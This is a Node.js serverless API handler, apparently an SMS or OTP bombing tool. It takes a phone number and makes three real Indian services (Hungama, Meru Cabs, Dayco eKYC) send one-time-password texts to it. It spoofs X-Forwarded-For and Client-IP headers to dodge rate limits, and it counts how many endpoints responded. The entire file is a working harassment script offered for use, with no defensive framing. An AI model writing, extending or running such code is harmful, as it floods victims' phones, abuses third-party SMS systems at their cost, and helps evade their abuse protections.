const fetch = require('node-fetch');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { phoneNumber, ipAddress = '192.168.1.1' } = req.body;

    if (!phoneNumber || !/^\d{10}$/.test(phoneNumber)) {
      return res.status(400).json({ error: 'Invalid phone number' });
    }

    const apis = [
      {
        endpoint: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        payload: {
          mobileNo: phoneNumber,
          countryCode: "+91",
          appCode: "un",
          messageId: "1",
          emailId: "",
          subject: "Register",
          priority: "1",
          device: "web",
          variant: "v1",
          templateCode: 1
        },
        headers: {
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
          "Content-Type": "application/json",
          "X-Forwarded-For": ipAddress,
          "Client-IP": ipAddress
        }
      },
      {
        endpoint: "https://merucabapp.com/api/otp/generate",
        method: "POST",
        payload: `mobile_number=${phoneNumber}`,
        headers: {
          "Mobilenumber": phoneNumber,
          "Content-Type": "application/x-www-form-urlencoded",
          "X-Forwarded-For": ipAddress,
          "Client-IP": ipAddress
        }
      },
      {
        endpoint: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        method: "POST",
        payload: `api=send_otp&brand=dayco&mob=${phoneNumber}&resend_otp=resend_otp`,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "X-Forwarded-For": ipAddress,
          "Client-IP": ipAddress
        }
      }
    ];

    // Send requests to all APIs
    const requests = apis.map(async (api) => {
      try {
        const options = {
          method: api.method,
          headers: api.headers,
          timeout: 5000
        };

        if (api.method === 'POST') {
          if (api.headers['Content-Type'] === 'application/json') {
            options.body = JSON.stringify(api.payload);
          } else {
            options.body = api.payload;
          }
        }

        const response = await fetch(api.endpoint, options);
        return {
          endpoint: api.endpoint,
          status: response.status,
          success: response.status === 200 || response.status === 201
        };
      } catch (error) {
        return {
          endpoint: api.endpoint,
          status: null,
          error: error.message,
          success: false
        };
      }
    });

    const results = await Promise.all(requests);
    const activeAPIs = results.filter(result => result.success).length;

    res.json({
      success: true,
      activeAPIs,
      results
    });

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error' 
    });
  }
};
